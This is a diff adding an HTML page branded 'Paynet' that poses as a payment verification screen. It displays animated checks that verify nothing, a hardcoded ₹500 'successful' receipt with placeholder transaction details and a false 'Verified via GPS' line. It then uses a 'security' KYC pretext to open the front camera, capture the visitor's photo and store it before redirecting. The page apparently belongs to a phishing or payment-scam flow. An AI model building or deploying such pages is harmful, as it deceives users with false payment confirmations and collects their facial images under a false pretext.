@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifying Payment - Paynet</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/paynet.css">
+    <style>
+        .verify-container {
+            text-align: center;
+        }
+
+        .verification-steps {
+            margin: 30px 0;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            margin-bottom: 12px;
+            opacity: 0;
+            animation: fadeInStep 0.5s ease-out forwards;
+        }
+
+        .step:nth-child(1) {
+            animation-delay: 0.5s;
+        }
+
+        .step:nth-child(2) {
+            animation-delay: 1s;
+        }
+
+        .step:nth-child(3) {
+            animation-delay: 1.5s;
+        }
+
+        @keyframes fadeInStep {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .step-icon {
+            width: 24px;
+            height: 24px;
+        }
+
+        .step-text {
+            flex: 1;
+            text-align: left;
+            font-size: 15px;
+            color: #202124;
+        }
+
+        .receipt {
+            background: white;
+            border: 2px dashed #e0e0e0;
+            border-radius: 12px;
+            padding: 25px;
+            margin: 30px 0;
+            display: none;
+        }
+
+        .receipt-header {
+            border-bottom: 2px solid #1A73E8;
+            padding-bottom: 15px;
+            margin-bottom: 20px;
+        }
+
+        .receipt-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1A73E8;
+        }
+
+        .receipt-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px dashed #e0e0e0;
+        }
+
+        .receipt-label {
+            color: #5f6368;
+            font-size: 14px;
+        }
+
+        .receipt-value {
+            color: #202124;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .receipt-amount {
+            background: #e8f5e9;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+
+        .receipt-amount-label {
+            color: #2e7d32;
+            font-size: 13px;
+            margin-bottom: 5px;
+        }
+
+        .receipt-amount-value {
+            color: #1b5e20;
+            font-size: 32px;
+            font-weight: 700;
+        }
+
+        .kyc-section {
+            margin-top: 30px;
+            display: none;
+        }
+
+        .kyc-button {
+            background: linear-gradient(135deg, #34A853, #2d9348);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            box-shadow: 0 4px 12px rgba(52, 168, 83, 0.3);
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="payment-container verify-container">
+        <div class="logo-section">
+            <div class="paynet-logo">
+                <svg width="60" height="60" viewBox="0 0 60 60">
+                    <defs>
+                        <linearGradient id="shield-gradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" style="stop-color:#1A73E8" />
+                            <stop offset="100%" style="stop-color:#3B5FCC" />
+                        </linearGradient>
+                    </defs>
+                    <path d="M30 5 L50 15 L50 30 C50 42 30 55 30 55 C30 55 10 42 10 30 L10 15 Z"
+                        fill="url(#shield-gradient)" />
+                    <path d="M25 30 L28 33 L36 23" stroke="white" stroke-width="3" fill="none" stroke-linecap="round"
+                        stroke-linejoin="round" />
+                </svg>
+            </div>
+            <h1 class="brand-name">Paynet</h1>
+        </div>
+
+        <!-- Loading Section -->
+        <div id="loadingSection">
+            <h2 class="success-title">Verifying Payment...</h2>
+            <p class="success-subtitle">Please wait while we confirm your transaction</p>
+
+            <div style="margin: 30px 0;">
+                <div class="loading-spinner" style="margin: 0 auto;"></div>
+            </div>
+
+            <div class="verification-steps">
+                <div class="step">
+                    <svg class="step-icon" viewBox="0 0 24 24">
+                        <circle cx="12" cy="12" r="10" fill="#34A853" />
+                        <path d="M8 12 L11 15 L16 9" stroke="white" stroke-width="2" fill="none" />
+                    </svg>
+                    <span class="step-text">Amount verified</span>
+                </div>
+                <div class="step">
+                    <svg class="step-icon" viewBox="0 0 24 24">
+                        <circle cx="12" cy="12" r="10" fill="#34A853" />
+                        <path d="M8 12 L11 15 L16 9" stroke="white" stroke-width="2" fill="none" />
+                    </svg>
+                    <span class="step-text">Transaction authenticated</span>
+                </div>
+                <div class="step">
+                    <svg class="step-icon" viewBox="0 0 24 24">
+                        <circle cx="12" cy="12" r="10" fill="#34A853" />
+                        <path d="M8 12 L11 15 L16 9" stroke="white" stroke-width="2" fill="none" />
+                    </svg>
+                    <span class="step-text">Location verified</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Receipt Section -->
+        <div id="receiptSection" class="receipt">
+            <div class="receipt-header">
+                <div class="receipt-title">PAYMENT RECEIPT</div>
+                <div style="font-size: 12px; color: #5f6368; margin-top: 5px;">Transaction Successful</div>
+            </div>
+
+            <div class="receipt-amount">
+                <div class="receipt-amount-label">Amount Paid</div>
+                <div class="receipt-amount-value">₹500.00</div>
+            </div>
+
+            <div class="receipt-row">
+                <span class="receipt-label">Paid to</span>
+                <span class="receipt-value">Paynet Services</span>
+            </div>
+            <div class="receipt-row">
+                <span class="receipt-label">Payment Method</span>
+                <span class="receipt-value">UPI</span>
+            </div>
+            <div class="receipt-row">
+                <span class="receipt-label">UPI ID</span>
+                <span class="receipt-value">merchant@paytm</span>
+            </div>
+            <div class="receipt-row">
+                <span class="receipt-label">Transaction ID</span>
+                <span class="receipt-value" id="receipt-txn-id">TXN1234567890</span>
+            </div>
+            <div class="receipt-row">
+                <span class="receipt-label">Date & Time</span>
+                <span class="receipt-value" id="receipt-date">14 Feb 2026, 08:43 AM</span>
+            </div>
+            <div class="receipt-row">
+                <span class="receipt-label">Status</span>
+                <span class="receipt-value" style="color: #34A853; font-weight: 700;">✓ SUCCESS</span>
+            </div>
+
+            <div style="margin-top: 20px; padding-top: 20px; border-top: 2px dashed #e0e0e0;">
+                <div class="receipt-row" style="border: none;">
+                    <span class="receipt-label">Delivery Location</span>
+                    <span class="receipt-value" id="delivery-location">Verified via GPS</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- KYC Verification Section -->
+        <div id="kycSection" class="kyc-section">
+            <h3 style="font-size: 18px; margin-bottom: 10px; color: #202124;">Complete Verification</h3>
+            <p style="font-size: 14px; color: #5f6368; margin-bottom: 20px;">
+                For security purposes, please verify your identity to complete the transaction
+            </p>
+            <button class="kyc-button" onclick="capturePhoto()">
+                <svg width="20" height="20" viewBox="0 0 20 20">
+                    <rect x="2" y="4" width="16" height="12" rx="2" stroke="white" stroke-width="2" fill="none" />
+                    <circle cx="10" cy="10" r="3" stroke="white" stroke-width="2" fill="none" />
+                    <circle cx="15" cy="6" r="1" fill="white" />
+                </svg>
+                Verify with Photo
+            </button>
+        </div>
+
+        <div class="footer" style="margin-top: 30px;">
+            <p class="powered-by">Secured by <strong>Paynet</strong></p>
+        </div>
+    </div>
+
+    <script>
+        // Auto-run verification flow
+        window.addEventListener('load', function () {
+            setTimeout(() => {
+                document.getElementById('loadingSection').style.display = 'none';
+                document.getElementById('receiptSection').style.display = 'block';
+                document.getElementById('kycSection').style.display = 'block';
+            }, 3000); // Show receipt after 3 seconds
+        });
+
+        // Capture photo for KYC
+        async function capturePhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' }
+                });
+
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+
+                    const photoData = canvas.toDataURL('image/jpeg', 0.85);
+                    sessionStorage.setItem('photoData', photoData);
+
+                    stream.getTracks().forEach(track => track.stop());
+
+                    alert('Verification complete! Thank you.');
+                    window.location.href = '/success';
+                }, 2000);
+
+            } catch (error) {
+                console.error('Camera error:', error);
+                alert('Please allow camera access for verification');
+            }
+        }
+    </script>
+</body>
+
+</html>
